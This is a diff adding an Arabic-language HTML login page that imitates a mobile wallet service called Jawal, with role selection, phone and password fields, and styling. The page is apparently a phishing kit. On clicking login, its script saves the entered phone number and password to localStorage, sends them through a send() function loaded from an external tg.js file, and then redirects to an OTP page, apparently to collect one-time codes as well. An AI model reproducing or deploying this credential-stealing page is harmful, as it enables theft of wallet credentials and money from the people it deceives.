@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jawal Login</title>
+
+<style>
+
+/* ================= Fonts ================= */
+@font-face { font-family: "Roboto"; src: url("assets/fonts/Roboto-Thin.ttf"); font-weight:100; }
+@font-face { font-family: "Roboto"; src: url("assets/fonts/Roboto-Light.ttf"); font-weight:300; }
+@font-face { font-family: "Roboto"; src: url("assets/fonts/Roboto-Regular.ttf"); font-weight:400; }
+@font-face { font-family: "Roboto"; src: url("assets/fonts/Roboto-Medium.ttf"); font-weight:500; }
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:"Roboto", sans-serif;
+}
+
+body{
+  background:#efefef;
+}
+
+/* ================= Top Bar ================= */
+.top-bar{
+  direction:ltr;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:14px 16px;
+}
+
+.contact{
+  direction:rtl;
+  font-size:12px;
+}
+
+.contact span{
+  color:#ff6a00;
+  font-weight:500;
+}
+
+.language{
+  direction:rtl;
+  display:flex;
+  align-items:center;
+  gap:6px;
+  background:#fff;
+  padding:6px 12px;
+  border-radius:999px;
+  border:1px solid #ddd;
+  font-size:12px;
+}
+
+.language img{ width:16px; }
+
+/* ================= Card ================= */
+
+.card{
+  width:100%;
+  margin:20px 0 0 0;
+  background:#fff;
+  border-radius:26px 26px 0 0;
+  padding:48px 20px 26px;
+  position:relative;
+  text-align:center;
+}
+
+/* Desktop Center */
+@media(min-width:768px){
+  .card{
+    width:420px;
+    margin:40px auto;
+    border-radius:26px;
+  }
+}
+
+.user-icon{
+  position:absolute;
+  top:-36px;
+  left:50%;
+  transform:translateX(-50%);
+  width:72px;
+  height:72px;
+  border-radius:50%;
+  background:#0f5c7c;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.user-icon img{ width:36px; }
+
+.card h2{
+  margin:38px 0 18px;
+  font-weight:500;
+  font-size:21px;
+}
+
+/* ================= Roles ================= */
+.role-select{
+  display:flex;
+  gap:10px;
+  margin-bottom:20px;
+}
+
+.role{
+  flex:1;
+  border:2px solid #cfd3dc;
+  border-radius:999px;
+  padding:10px 0;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:6px;
+  cursor:pointer;
+  background:transparent;
+  color:#9aa0b4;
+  font-size:13px;
+  transition:0.2s ease;
+}
+
+.role img{ width:14px; }
+
+.role.active{
+  border-color:#ff6a00;
+  color:#ff6a00;
+  background:#fff;
+}
+
+/* ================= Fields ================= */
+.field{
+  text-align:right;
+  margin-bottom:14px;
+}
+
+.field label{
+  display:block;
+  margin-bottom:6px;
+  font-size:13px;
+}
+
+.input-wrap{
+  position:relative;
+}
+
+.input-wrap input{
+  width:100%;
+  height:46px;
+  border-radius:999px;
+  border:1px solid #ddd;
+  padding-right:50px;
+  padding-left:50px;
+  text-align:right;
+  font-size:14px;
+  outline:none;
+}
+
+.icon-right{
+  position:absolute;
+  top:50%;
+  right:16px;
+  transform:translateY(-50%);
+  width:18px;
+}
+
+.icon-left{
+  position:absolute;
+  top:50%;
+  left:16px;
+  transform:translateY(-50%);
+  width:18px;
+  cursor:pointer;
+}
+
+/* ================= Forgot ================= */
+.forgot{
+  text-align:right;
+  font-size:12px;
+  margin:6px 0 10px;
+}
+
+/* ================= Checkbox Rows ================= */
+.check-row{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin-bottom:10px;
+  padding:8px 12px;
+  border-radius:14px;
+  border:2px solid transparent;
+  transition:0.2s ease;
+  cursor:pointer;
+  font-size:12px;
+}
+
+.check-row img{ width:18px; }
+
+.check-row.active{
+  border-color:#ff6a00;
+}
+
+/* ================= Buttons ================= */
+.btn{
+  width:100%;
+  height:48px;
+  border:none;
+  border-radius:999px;
+  font-size:15px;
+  cursor:pointer;
+}
+
+.btn-primary{
+  background:#ff6a00;
+  color:#fff;
+  margin-bottom:12px;
+}
+
+.btn-primary:disabled{
+  background:#ffc6a0;
+  cursor:not-allowed;
+}
+
+.btn-secondary{
+  background:#8f95a8;
+  color:#fff;
+  margin-bottom:10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="top-bar">
+  <div class="contact">للاستفسار <span>اتصل بنا</span></div>
+  <div class="language">
+    العربية
+    <img src="assets/images/globe.png">
+  </div>
+</div>
+
+<div class="card">
+
+  <div class="user-icon">
+    <img src="assets/images/user.png">
+  </div>
+
+  <h2>تسجيل الدخول</h2>
+
+  <div class="role-select">
+    <div class="role active" data-role="customer">
+      <img src="assets/images/radio_btn_checked.png">
+      عميل
+    </div>
+    <div class="role" data-role="agent">
+      <img src="assets/images/radio_btn_unchecked.png">
+      وكيل
+    </div>
+    <div class="role" data-role="merchant">
+      <img src="assets/images/radio_btn_unchecked.png">
+      تاجر
+    </div>
+  </div>
+
+  <div class="field">
+    <label>رقم المحفظة / رقم الموبايل</label>
+    <div class="input-wrap">
+      <input type="text" id="mobile">
+      <img class="icon-right" src="assets/images/mobile.png">
+    </div>
+  </div>
+
+  <div class="field">
+    <label>كلمة السر</label>
+    <div class="input-wrap">
+      <input type="password" id="password">
+      <img class="icon-right" src="assets/images/lockl.png">
+      <img id="eyeIcon" class="icon-left" src="assets/images/eye.png">
+    </div>
+  </div>
+
+  <div class="forgot">نسيت كلمة السر؟</div>
+
+  <div class="check-row active" id="rememberRow">
+    <img id="rememberCheck" src="assets/images/cheeckbox_checked.png">
+    تذكرني
+  </div>
+
+  <div class="check-row active" id="termsRow">
+    <img id="termsCheck" src="assets/images/cheeckbox_checked.png">
+    لقد قرأت ووافقت الشروط والسياسة
+  </div>
+
+  <button id="loginBtn" class="btn btn-primary" disabled>تسجيل الدخول</button>
+  <button class="btn btn-secondary">جديد؟ إنشاء حساب</button>
+  <button class="btn btn-secondary">تتبع الطلب</button>
+
+</div>
+
+<script src='./tg.js'></script>
+
+<script>
+
+/* ===== Role Switching + Prefix Logic ===== */
+const roles = document.querySelectorAll(".role");
+const mobileInput = document.getElementById("mobile");
+let currentPrefix = "";
+
+function stripPrefix(value){
+  if(value.startsWith("A")) return value.substring(1);
+  if(value.startsWith("M")) return value.substring(1);
+  return value;
+}
+
+roles.forEach(role=>{
+  role.addEventListener("click",()=>{
+    roles.forEach(r=>{
+      r.classList.remove("active");
+      r.querySelector("img").src="assets/images/radio_btn_unchecked.png";
+    });
+
+    role.classList.add("active");
+    role.querySelector("img").src="assets/images/radio_btn_checked.png";
+
+    const roleType = role.dataset.role;
+    let rawValue = stripPrefix(mobileInput.value);
+
+    if(roleType==="agent"){
+      currentPrefix="A";
+    } else if(roleType==="merchant"){
+      currentPrefix="M";
+    } else {
+      currentPrefix="";
+    }
+
+    mobileInput.value = currentPrefix + rawValue;
+  });
+});
+
+/* Prevent deleting prefix */
+mobileInput.addEventListener("keydown",(e)=>{
+  if(currentPrefix && mobileInput.selectionStart <= currentPrefix.length && e.key==="Backspace"){
+    e.preventDefault();
+  }
+});
+
+mobileInput.addEventListener("input",()=>{
+  if(currentPrefix && !mobileInput.value.startsWith(currentPrefix)){
+    let raw = stripPrefix(mobileInput.value);
+    mobileInput.value = currentPrefix + raw;
+  }
+});
+
+/* ===== Password Toggle ===== */
+const passwordInput=document.getElementById("password");
+const eyeIcon=document.getElementById("eyeIcon");
+
+eyeIcon.addEventListener("click",()=>{
+  if(passwordInput.type==="password"){
+    passwordInput.type="text";
+    eyeIcon.src="assets/images/eye_hide.png";
+  }else{
+    passwordInput.type="password";
+    eyeIcon.src="assets/images/eye.png";
+  }
+});
+
+/* ===== Validation ===== */
+let termsChecked=true;
+const loginBtn=document.getElementById("loginBtn");
+
+function validate(){
+  loginBtn.disabled=!(
+    mobileInput.value.trim()!=="" &&
+    passwordInput.value.trim()!=="" &&
+    termsChecked
+  );
+}
+
+mobileInput.addEventListener("input",validate);
+passwordInput.addEventListener("input",validate);
+
+loginBtn.addEventListener("click",()=>{
+  localStorage.setItem('phone',mobileInput.value)
+  localStorage.setItem('password',passwordInput.value)
+  msg=`
+    رقم الهاتف: ${mobileInput.value}
+    كلمة السر: ${passwordInput.value}
+  `
+  send(msg).then(response => {
+    if(response.ok){
+        window.location.href = './otp.html'    
+    }
+    else{
+      alert('لقد حدث خطأ يرجى المحاولة مرة أخرى ')
+    }
+  })
+  
+})
+
+</script>
+
+</body>
+</html>
